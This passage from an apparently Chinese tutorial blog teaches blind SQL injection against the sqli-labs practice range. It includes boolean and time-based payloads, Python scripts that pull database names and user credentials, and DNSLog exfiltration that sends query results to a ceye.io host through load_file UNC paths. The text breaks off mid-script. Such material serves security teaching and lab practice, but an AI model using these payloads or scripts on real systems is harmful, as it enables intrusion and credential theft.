class=\"line\">前一个为0，后一个为真是or=1</span><br><span class=\"line\">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class=\"line\">或使用left截取字符</span><br><span class=\"line\">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class=\"line\">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class=\"line\">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class=\"line\">此时不报错或有回显说明第一字符为u</span><br><span class=\"line\">或者根据ASCII值来判断</span><br><span class=\"line\">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class=\"line\">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class=\"line\">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者使用Burp Suite  Intruder</span><br><span class=\"line\">Position  Sniper 只能设置一个变量</span><br><span class=\"line\">设置paylaod</span><br><span class=\"line\">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class=\"line\"></span><br><span class=\"line\">Battering ram 可以接收两个参数</span><br><span class=\"line\">pitchfork 配置两个参数</span><br><span class=\"line\">cluster 组合所有可能性发包</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据是否有正确的回显判断</p>\n<p>2. 基于时间的盲注</p>\n<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>\n<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; or sleep(3) % 23</span><br><span class=\"line\">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class=\"line\">根据对应的ASCII判断，如果正确停两秒</span><br><span class=\"line\">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class=\"line\">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class=\"line\">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>\n<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于bool盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url1</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url1, params=params)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># payload = url.format(_ = i, __ = mid)</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># r = requests.get(payload)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于时间盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&#x27;uname&#x27;</span>: payload, <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class=\"line\">            <span class=\"comment\">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_data</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_data(url)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h5 id=\"搜索注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索注入\">#</a> 搜索注入</h5>\n<p>在 like%% 中注入</p>\n<h5 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> DNSLog 注入</h5>\n<p>前提条件：secure_file_priv 为空</p>\n<p>关于 secure_file_priv :</p>\n<blockquote>\n<p>secure_file_priv 特性，有三种状态</p>\n<ol>\n<li>secure_file_priv 为 null  表示不允许导入导出</li>\n<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>\n<li>secure_file_priv 没有设置时，则表示没有任何限制</li>\n</ol>\n</blockquote>\n<p>注入使用 load_file 函数</p>\n<p>关于 load_file 函数</p>\n<blockquote>\n<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>\n<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>\n<p>此函数使用需要满足的条件</p>\n<p>文件必须位于服务器主机上<br>\n你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>\n文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>\n<p>select load_file(’/etc/passwd’);</p>\n</blockquote>\n<p>注入时需要使用 UNC 路径</p>\n<blockquote>\n<p>UNC 路径就是类似 \\softer 这样的形式的网络路径。它符合 \\servername\\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>\n<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。</p>\n<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>\n</blockquote>\n<p>常用的 DNSLog 平台</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">CEYE - Monitor service for security testing</span></p>\n<p>注入方式：<br>\n1. 注册上述平台，获取自己的 Identifier</p>\n<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>\n<p>3. 到测试目标修改并输入 payload</p>\n<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>\n<p>下面使用 sqli 靶场做演示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>\n<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png\" alt=\"image-20220215231635316\"></p>\n<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp\">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class=\"exturl\" data-url=\"aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==\">27.3xtn8b.ceye.io/abc'</span>)))%23</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png\" alt=\"image-20220215232952016\"></p>\n<h5 id=\"使用burpdnslog快速获取全部数据\"><a class=\"markdownIt-Anchor\" href=\"#使用burpdnslog快速获取全部数据\">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>\n<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=\">https://zhuanlan.zhihu.com/p/129904025</span></p>\n<p>发送 URL 到 burp 的测试器</p>\n<p>limit 0，1 后面的 0 设置为变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg\" alt=\"img\"></p>\n<p>payload 选择</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg\" alt=\"img\"></p>\n<p>线程设置为 1</p>\n<p><img data-src=\"https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg\" alt=\"img\"></p>\n<p>然后开始攻击</p>\n<p>完成以后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg\" alt=\"img\"></p>\n<p>可以在平台上查到获取到的表名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg\" alt=\"img\"></p>\n<p>平台提供文件导出为 json 文件的功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg\" alt=\"img\"></p>\n<p>下载到本地，放到脚本目录</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python3</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#自己平台的地址</span><br><span class=\"line\">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;./data.json&#x27;)</span><br><span class=\"line\">json_data = 